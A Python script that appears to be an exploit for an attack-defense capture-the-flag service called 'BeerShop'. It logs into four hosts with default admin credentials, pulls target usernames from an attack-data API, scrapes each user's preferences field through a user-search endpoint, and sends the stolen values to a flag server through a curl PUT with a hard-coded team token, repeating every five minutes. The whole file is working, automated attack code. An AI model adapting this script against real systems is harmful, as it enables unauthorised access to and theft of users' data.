import requests, time
from ast import literal_eval
import subprocess

# Define the URL for the login page


# Create a session object

hosts = ["10.80.1.2", "10.80.5.2", "10.80.4.2", "10.80.3.2"]

def main_login(login_url, session):
    # Define the login credentials
    credentials = {
        "username": "admin",
        "password": "pass"
    }

    # Perform the login
    response = session.post(login_url, data=credentials)

    # Check if login was successful
    if response.ok:
        print("Login successful!")
    else:
        print("WRONG")
        exit(-1)
    
    return session



def attack_login(login, session, HOST):
    try:
        response = session.get(f'http://{HOST}:5164/profile/user-search?username=' + login)
        dat = response.text
        dat = dat.split("Preferences:</strong> ")[1]
        dat = dat.split("</p>")[0]
        
        subprocess.getoutput(f'curl -X PUT "http://10.10.10.10/flags" -H "X-Team-Token: 2ba32ac38fc175e3" -H "Content-Type: application/json" -d \'["flag", "{dat}"]\'')
    except IndexError:
        return
    return

while True:
    for HOST in hosts:
        print(HOST)
        session = requests.Session()
        session = main_login(f"http://{HOST}:5164/login", session)
        attack_data = requests.get("http://ad.punchclub.ru/api/client/attack_data/").json()['BeerShop'][HOST]
        for data in attack_data:
            data = literal_eval(data)
            login = data['username']
            if data['location'] == 'user_preferences':
                attack_login(login, session, HOST)
                time.sleep(1)
        # print(data)
        session.close()
    print("Sleep")
    time.sleep(60 * 5)

# print(attack_data)
